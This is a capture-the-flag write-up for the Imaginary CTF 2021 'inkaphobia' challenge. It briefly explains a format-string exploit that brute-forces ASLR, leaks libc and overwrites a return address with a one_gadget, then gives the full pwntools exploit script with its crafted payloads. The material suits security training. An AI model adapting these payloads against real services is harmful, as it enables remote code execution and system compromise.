Inkaphobia was a challenge from Imaginary CTF 2021

it is basically a format string vulnerability to exploit remotely

the strategy to exploit was to use a stack pointer (reachable with the format string offsets)

that points to another stack pointer.

with this pointer we modify the next stack pointer, to make it point to '_libc_ret_main_' return address

we use this new pointer, to write a one gadget instead of the return address..

I did it in 3 pass...

one pass to bruteforce the ASLR, to have an ASLR favorable to us.. (no bad moon rising)

when we have a good ASLR we use %*c to read 32bit low on stack address, and write it to the target pointers..

then dump a libc address , and write onto ret address using pwntools format string functions..

see in in action...

![](https://github.com/nobodyisnobody/write-ups/raw/main/Imaginary.CTF.2021/pwn/inkaphobia/pics/inkaphobia.gif)

```python
from pwn import *
import sys
context.update(arch="amd64", os="linux")
context.log_level = 'error'

exe = context.binary = ELF('./inkaphobia')
libc = ELF('./libc.so.6')

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]


for j in range(1000):
  if args.REMOTE:
    p = connect('chal.imaginaryctf.org', 42008)
  else:
    p = process('./inkaphobia')
  p.recvuntil('service!\n', drop=True)
  p.sendlineafter('value: ', '1\n1\n1\n1\n1\n1')		# pass rng
  payload = '%c'*71+'%p.'+'%c'*4+'%*c'+'%c'*12+'%65194c'+'%hn'+'%c'*11+'%6c'+'%hhnTOTO'
  p.sendlineafter('name?\n', payload)
  try:
    p.readuntil('0x', drop=True)
    leak = int(p.readuntil('.', drop=True),16) - 0x270b3
    if ((leak & 0xff000000)>>24) > 16:
      p.close()
      print(str(j))
      continue
    print('leak ='+hex(leak))
    sys.stdout.flush()
    p.recvuntil('TOTO', drop=True)
    print('TOTO OK..')
    p.sendlineafter('value: ', '1\n1\n1\n1\n1\n1')
    payload = '%153c%105$hhnAAAA%75$pBBBB%77$pCCCC'
    p.sendlineafter('name?\n', payload)
    p.readuntil('AAAA', drop=True)
    libc.address = int(p.readuntil('BBBB', drop=True),16) - 0x270b3
    print('libc.base ='+hex(libc.address))
    onegadgets = one_gadget('libc.so.6', libc.address)
    stack = int(p.readuntil('CCCC', drop=True),16)
    p.sendlineafter('value: ', '1\n1\n1\n1\n1\n1')
    p.sendlineafter('name?\n', fmtstr_payload(8, {stack - 0xf0: onegadgets[1]}))
    p.sendline('id;cat flag*')
    p.interactive()
    break
  except:
    print(str(j))
    p.close()

p.close()
```
